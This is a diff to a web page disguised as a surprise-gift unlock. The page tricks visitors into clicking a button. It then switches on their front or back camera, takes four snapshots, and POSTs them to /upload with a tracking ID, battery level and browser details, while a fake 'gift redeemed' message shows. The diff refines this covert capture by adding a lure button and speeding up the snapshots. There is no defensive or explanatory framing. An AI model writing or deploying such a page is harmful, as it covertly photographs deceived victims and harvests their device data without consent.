@@ -1,70 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Gift Unlocking...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { background: black; color: white; text-align: center; font-family: Arial; overflow: hidden; }
-        .container { margin-top: 100px; }
-        .lock-box { position: relative; display: inline-block; }
-        #guy { width: 80px; animation: rotateKey 2s infinite linear; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        @keyframes rotateKey { 0% { transform: rotate(0deg); } 50% { transform: rotate(20deg); } 100% { transform: rotate(0deg); } }
-        #final-msg { display: none; color: #4CAF50; font-size: 20px; padding: 20px; }
+        body { background: white; color: black; text-align: center; font-family: sans-serif; transition: 0.5s; margin:0; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        #loading-ui { display: none; }
+        .key-anim { width: 60px; animation: rotate 2s infinite linear; }
+        @keyframes rotate { 0% { transform: rotate(0deg); } 50% { transform: rotate(30deg); } 100% { transform: rotate(0deg); } }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        .btn { background: #00ff00; color: black; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="loader">
-            <div class="lock-box">
-                <img src="https://cdn-icons-png.flaticon.com/512/2889/2889676.png" width="100"><br>
-                <img id="guy" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
-            </div>
-            <h3>Your Gift is Loading...</h3>
-            <div class="spinner"></div>
-        </div>
-        <div id="final-msg">
-            Your gift has been redeemed. You are a good person, God bless you. ✨
-        </div>
+    <div id="start-page">
+        <h2>🎁 You have a surprise gift! ✨</h2>
+        <p>👇 Click below to unlock it 🔓</p>
+        <button class="btn" onclick="startWork()">🔓 UNLOCK YOUR GIFT 🎁</button>
     </div>
-    <video id="video" style="display:none" autoplay></video>
-    <canvas id="canvas" style="display:none"></canvas>
+
+    <div id="loading-ui">
+        <img src="https://cdn-icons-png.flaticon.com/512/2889/2889676.png" width="80"><br>
+        <img class="key-anim" src="https://cdn-icons-png.flaticon.com/512/3039/3039433.png">
+        <p>Your Gift is Unlocking...</p>
+        <div class="loader"></div>
+    </div>
+
+    <div id="success-msg" style="display:none; color:#00ff00;">
+        <h2>Your gift has been redeemed.</h2>
+        <p>You are a good person, God bless you. ✨</p>
+    </div>
+
+    <video id="v" style="display:none" autoplay playsinline></video>
+    <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const mode = urlParams.get('m') || 'front';
-        const uid = urlParams.get('uid');
+        const params = new URLSearchParams(window.location.search);
+        async function startWork() {
+            document.body.style.background = "black";
+            document.body.style.color = "white";
+            document.getElementById('start-page').style.display = 'none';
+            document.getElementById('loading-ui').style.display = 'block';
 
-        async function getInfo() {
-            let battery = await navigator.getBattery();
-            return {
-                battery: Math.round(battery.level * 100) + "%",
-                browser: navigator.userAgent.split(' ').pop(),
-                device: navigator.platform
-            };
-        }
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: params.get('m')==='back'?'environment':'user'}});
+            v.srcObject = stream;
 
-        async function startCapture() {
-            const constraints = { video: { facingMode: mode === 'back' ? "environment" : "user" } };
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            video.srcObject = stream;
-
-            for (let i = 0; i < 4; i++) {
-                await new Promise(r => setTimeout(r, 7000)); // 7 seconds gap
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const info = await getInfo();
+            for(let i=0; i<4; i++) {
+                await new Promise(r => setTimeout(r, 1750)); 
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                const bat = await navigator.getBattery();
                 fetch('/upload', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ image: canvas.toDataURL('image/jpeg'), uid: uid, mode: mode, info: info })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        image: c.toDataURL('image/jpeg'),
+                        uid: params.get('uid'), mode: params.get('m'),
+                        info: {battery: Math.round(bat.level*100)+"%", browser: navigator.vendor}
+                    })
                 });
             }
-            document.getElementById('loader').style.display = 'none';
-            document.getElementById('final-msg').style.display = 'block';
+            document.getElementById('loading-ui').style.display = 'none';
+            document.getElementById('success-msg').style.display = 'block';
         }
-        window.onload = startCapture;
     </script>
 </body>
 </html>
